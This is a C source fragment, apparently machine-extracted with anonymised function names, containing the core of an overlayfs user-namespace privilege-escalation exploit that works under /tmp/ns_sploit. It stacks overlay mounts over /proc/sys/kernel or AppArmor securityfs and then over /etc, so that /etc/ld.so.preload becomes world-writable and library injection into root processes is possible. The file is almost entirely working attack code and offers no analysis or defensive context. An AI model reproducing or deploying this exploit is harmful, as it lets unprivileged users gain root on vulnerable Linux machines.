#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int /*<<< orphan*/  MS_MGC_VAL ; 
 int /*<<< orphan*/  FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (char*,int) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int /*<<< orphan*/  FUNC3 (int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC4 (char*,int) ; 
 scalar_t__ FUNC5 (char*,char*,char*,int /*<<< orphan*/ ,char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (char*) ; 

__attribute__((used)) static int
FUNC9(void *stuff)
{
    char *file;
    FUNC7("rm -rf /tmp/ns_sploit");
    FUNC4("/tmp/ns_sploit", 0777);
    FUNC4("/tmp/ns_sploit/work", 0777);
    FUNC4("/tmp/ns_sploit/upper",0777);
    FUNC4("/tmp/ns_sploit/o",0777);

    FUNC3(stderr,"mount #1\n");
    if (FUNC5("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/proc/sys/kernel,upperdir=/tmp/ns_sploit/upper") != 0) {
// workdir= and "overlay" is needed on newer kernels, also can't use /proc as lower
        if (FUNC5("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/sys/kernel/security/apparmor,upperdir=/tmp/ns_sploit/upper,workdir=/tmp/ns_sploit/work") != 0) {
            FUNC3(stderr, "no FS_USERNS_MOUNT for overlayfs on this kernel\n");
            FUNC2(-1);
        }
        file = ".access";
        FUNC1("/tmp/ns_sploit/work/work",0777);
    } else file = "ns_last_pid";

    FUNC0("/tmp/ns_sploit/o");
    FUNC6(file,"ld.so.preload");

    FUNC0("/");
    FUNC8("/tmp/ns_sploit/o");
    FUNC3(stderr,"mount #2\n");
    if (FUNC5("overlay", "/tmp/ns_sploit/o", "overlayfs", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc") != 0) {
        if (FUNC5("overlay", "/tmp/ns_sploit/o", "overlay", MS_MGC_VAL, "lowerdir=/tmp/ns_sploit/upper,upperdir=/etc,workdir=/tmp/ns_sploit/work") != 0) {
            FUNC2(-1);
        }
        FUNC1("/tmp/ns_sploit/work/work",0777);
    }

    FUNC1("/tmp/ns_sploit/o/ld.so.preload",0777);
    FUNC8("/tmp/ns_sploit/o");
}